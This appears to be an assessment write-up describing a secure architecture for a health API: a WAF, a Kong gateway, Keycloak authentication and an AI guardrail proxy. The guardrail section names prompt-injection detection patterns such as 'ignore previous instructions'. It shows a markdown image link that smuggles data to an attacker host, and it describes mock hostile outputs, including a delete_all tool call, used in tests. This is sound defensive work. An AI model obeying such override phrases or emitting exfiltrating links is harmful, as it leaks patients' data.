# Section 1A: API gateway, WAF and AI guardrails

## a. Architecture

The architecture diagram is provided in `architecture.md` and `README.md` (vector SVG and PNG) with an interactive version available in diagrams.net. The design has four network zones. Clients reach a public edge that holds only the WAF and the identity provider. Behind it sits a private application zone with no route to the internet: the API gateway, the services, the database and the AI guardrail proxy. A narrow egress zone holds the one path out to an enterprise LLM. Wazuh sits across all of them and receives logs from every component.

Three design decisions drive the rest of the document.

* **The WAF sits in front of the gateway, not behind it.** Kong can run ModSecurity-style plugins, but putting a dedicated WAF first means malformed and obviously hostile traffic is dropped before it reaches anything that holds routing logic or credentials. It also gives the SIEM a clean "blocked at the edge" signal that is separate from "rejected by the application".
* **Authentication is checked twice.** In the demo, the services verify the Keycloak JWT themselves. In production I would also verify at Kong (OSS `jwt` plugin with the realm's RS256 public key, or the `openid-connect` plugin on Kong Enterprise or APISIX, which fetches JWKS automatically). A request that somehow bypasses the gateway, through a misconfigured network policy or a compromised sidecar, still meets a locked door. The cost is a few milliseconds and some duplicated configuration.
* **LLM access is a service, not a capability.** Applications never hold a provider key and never have a route to the LLM host. They call an internal proxy that applies policy. If a team wants a new model or a new use of the model, the change is a reviewed policy change in one place.

**Cloud preference.** The stack is containerised and cloud-neutral, so it runs on any provider Savannah's customers use. For a Kenyan health workload my first choice would be a Nairobi or in-country hosting option where the customer requires it, and otherwise AWS `af-south-1` (Cape Town) or Azure South Africa North, with Kubernetes (EKS/AKS) as the runtime. The Data Protection Act 2019 restricts transfer of personal data out of Kenya (sections 48 to 50) and its 2021 regulations add local-processing requirements for some categories. I would confirm with legal counsel which apply to each customer before choosing a region. Managed equivalents for the pieces above: AWS WAF or Azure Front Door WAF for edge; API Gateway or Azure APIM if the customer mandates native services; Cognito or Entra ID for identity; KMS or Key Vault for keys.

## c. Two sample APIs behind the gateway and WAF

The code is in `services/patients` and `services/appointments`, and `infra/docker-compose.yml` wires them behind Kong and ModSecurity.

```bash
cd infra && cp .env.example .env && docker compose up -d --build
cd .. && ./scripts/demo.sh        # produces the evidence for the screenshots
```

What each API does and why it is shaped this way:

- **Patients API** (`GET /patients/{id}`, `GET /patients`, `POST /patients`). It handles the most sensitive data, so it carries the strictest rate limit (30 requests per minute per IP) and role rules. Clinicians see full records. Receptionists see a masked view (ID shortened to the last three digits, no diagnosis). Every read writes an audit log line containing user, action, patient id and request id.
- **Appointments API** (`GET /appointments?patient_id=`, `POST /appointments`). The reason field is capped at 200 characters and the service has no access to the patients table, so a bug or injection in this service cannot expose clinical data.

`scripts/demo.sh` runs the evidence checks: missing and forged tokens return 401, a receptionist calling a clinician endpoint gets 403, SQL injection, XSS, path traversal and a scanner user-agent are blocked by the WAF with 403, request 31 and beyond within a minute returns 429, a 200 KB body returns 413, and invalid input returns 422. The last section exercises the AI proxy.

## d. Rate limiting, authentication and secure data handling

**Rate limiting.** Limits are layered because each layer catches something different. The WAF handles volumetric abuse and bot signatures. Kong applies per-route limits keyed on client IP (30 per minute for patients, 60 for appointments). For authenticated traffic I would switch the key to the consumer or token subject, because a whole clinic can sit behind one NAT address and an IP limit would punish them together. Counters should live in Redis in production so several gateway replicas share them (the demo uses `policy: local`). Login endpoints get a much stricter limit than data endpoints, and Keycloak's brute-force detector adds account-level lockout. A limit that is too tight on a clinical system is a patient-safety risk, so limits go in monitor mode first and get set from observed traffic with headroom.

**Authentication and authorisation.** Human users use OIDC authorization code flow with PKCE and MFA. The password grant in the demo exists only so the script can fetch tokens without a browser. Service-to-service and partner integrations use OAuth2 client credentials with narrow scopes, and for the most sensitive partners mutual TLS on top. Tokens are short-lived RS256 JWTs. The API pins the algorithm, so `alg: none` and HS256 confusion attacks fail. Authorisation is role-based at the endpoint and also filtered by attributes inside the handler. Production would add object-level checks (a clinician sees patients at their facility), because role checks alone invite broken object level authorisation, the top item in the OWASP API Top 10.

**Secure data handling.** TLS everywhere, including between the gateway and the services in production (the demo uses plain HTTP inside the internal network to stay simple). Encryption at rest with customer-managed keys. Secrets come from a secrets manager (Vault, AWS Secrets Manager or Key Vault) injected at runtime, never baked into images or committed. Data minimisation is built in: the masked view, the 200-character cap on free text, no PHI in URLs or logs. Retention is explicit and short for logs. Backups are encrypted, restore-tested and kept in a separate account so ransomware that reaches production cannot delete them.

## e. AI input and output guardrails

The working implementation is `guardrails/proxy.py` and `guardrails/detectors.py`, with 16 passing tests in `guardrails/tests/`. Policy is enforced in four layers, from cheapest to most expensive.

**Layer 1, network.** Only the proxy can reach the LLM host. Everything else is denied at the egress firewall, and consumer chatbot domains are blocked at DNS and the web proxy. No code path, including a developer script or a compromised service, can talk to an LLM without crossing the policy point. This is what makes the other layers meaningful.

**Layer 2, gateway hygiene.** Authentication by internal API key (provider keys never leave the proxy), model allow-list, input size cap, streaming disabled until chunk-window scanning is built, request ID on every call. On Kong 3.6 and later, the bundled `ai-proxy`, `ai-prompt-guard` and `ai-prompt-decorator` plugins can implement allow and deny patterns directly in the gateway. I built a standalone proxy because it keeps the policy testable in plain Python and shows what each check does. The enterprise-grade alternative is Kong's AI plugins or LiteLLM with a guardrail callback.

**Layer 3, inbound content policy.**

| Check                                                                             | Method                                                                                                                                 | Action                                                            |
| --------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- |
| PHI (Kenyan national ID in context, MRN, SHA number, DOB, patient name pattern)  | Context-anchored regex. A bare 8-digit number is not flagged, which keeps false positives down.                                        | Block with 400. The response names the category, never the value. |
| PII (phone, email, KRA PIN, card number with Luhn check)                          | Regex plus checksum                                                                                                                    | Block                                                             |
| Secrets (connection strings, cloud keys, JWTs, private keys, API-key assignments) | Regex                                                                                                                                  | Block, and alert the SIEM so the credential can be rotated        |
| Prompt injection                                                                  | Weighted pattern scoring ("ignore previous instructions", prompt-extraction phrasing, chat-template tokens, exfiltration instructions) | Block at score 0.7 or above                                       |

Regex is fast and auditable but misses free-text names and paraphrased attacks. The upgrade path is Microsoft Presidio with a spaCy NER model for names and addresses, and a small classifier (Llama Prompt Guard or a similar model) as a second-opinion for injection. Both add tens of milliseconds and false positives, so I would run them in monitor mode first and measure before enforcing.

**Layer 4, outbound content policy.** Responses are scanned the same way. PII and PHI are replaced with `[REDACTED:KIND]`. Markdown images and links to hosts outside an allow-list are removed, because rendering `![](https://attacker/?d=...)` is a standard way to smuggle data out of a chat UI. Tool calls the model returns that are not on an allow-list are dropped, which matters when a model is connected to agents. The mock LLM in the repo deliberately returns a phone number, an email, a card number, a hostile image link and a `delete_all` tool call so the tests prove each of those is neutralised.

**Logging without leaking.** Findings carry the category and offsets but never the matched text. Audit lines contain a pseudonymous caller id, categories and counts. If the proxy's own logs held prompts, the SIEM would become a second copy of the data we are trying to protect.

**Limits worth stating plainly.** Pattern-based detection will miss obfuscated data (spacing, homoglyphs, base64) and cannot judge context ("this diagnosis belongs to a real person"). Indirect prompt injection, where a poisoned document or web page carries the instruction, is only partly caught by scanning. The structural defences are therefore the important ones: least-privilege tool access, human approval for write actions, and no standing credentials for the model to misuse.

## f. Technical risks and mitigations

| Risk                                             | Why it matters here                                               | Mitigation                                                                                                                                                                         |
| ------------------------------------------------ | ----------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| WAF false positives block clinical workflows     | Free-text clinical notes contain SQL-like and script-like strings | `DetectionOnly` first, targeted exclusions per route, paranoia level 2 not 4, an emergency bypass runbook with approval and logging                                              |
| WAF bypass (encoding tricks, HTTP smuggling)     | CRS is signature-based                                            | Keep CRS updated, normalise at the gateway, strict parsing in services, parameterised queries so a bypass does not equal injection                                                 |
| Gateway or WAF as single point of failure        | Everything depends on it                                          | At least two replicas across zones, health checks, tested rollback, fail-closed for data APIs                                                                                      |
| Gateway bypass                                   | Direct access to a service skips controls                         | Private subnets, security groups that only admit the gateway, JWT verification in services (already implemented)                                                                   |
| Token theft or replay                            | Bearer tokens are portable                                        | 5-minute lifetime, refresh token rotation, TLS only, bind to client with mTLS or DPoP for sensitive partners                                                                       |
| Broken object level authorisation                | The most common real API breach                                   | Object-level checks in handlers, negative authorisation tests in CI, DAST with two users                                                                                           |
| Excessive data exposure in responses             | Easy for generated code to return whole rows                      | Explicit response models, masking by role, schema review in PRs                                                                                                                    |
| Guardrail evasion                                | Attackers rephrase, encode or split secrets across turns          | Defence in depth (network, content, tool permissions), monitoring of block rates, red-team prompts in CI, periodic review                                                          |
| Guardrail false positives frustrate staff        | People route around controls, creating shadow AI                  | Monitor mode first, clear block messages with a "how to do this safely" link, fast exception process                                                                               |
| Proxy latency                                    | Added scanning delays every call                                  | Regex layer is sub-millisecond, heavier models run async or on sampled traffic, budget measured and published                                                                      |
| Proxy holds the provider key                     | It becomes a high-value target                                    | Key in secrets manager, rotation, proxy isolated, outbound restricted to one host, no shell in the image                                                                           |
| Prompt and response data held by the LLM vendor  | Health data leaving the organisation                              | Enterprise agreement with no-training and zero-retention terms, DPA review, residency check, DPIA before go-live                                                                   |
| Logs become a PHI store                          | Debug logging captures payloads                                   | Structured logging with allow-listed fields, automated tests that fail on PHI patterns in log output                                                                               |
| Denial of wallet                                 | LLM calls are billed per token                                    | Per-team quotas and rate limits at the proxy, budget alerts                                                                                                                        |
| Secrets in the repo or images                    | Common and costly                                                 | Pre-commit and server-side scanning, secrets manager, image scanning                                                                                                               |
| Configuration drift into production environments | Debug modes, non-production grant types, exposed API docs         | Automated policy-as-code linting (OPA/Conftest), pre-deployment configuration baselines, and CI/CD gate rejection for non-production flags before deployment to staging/production |
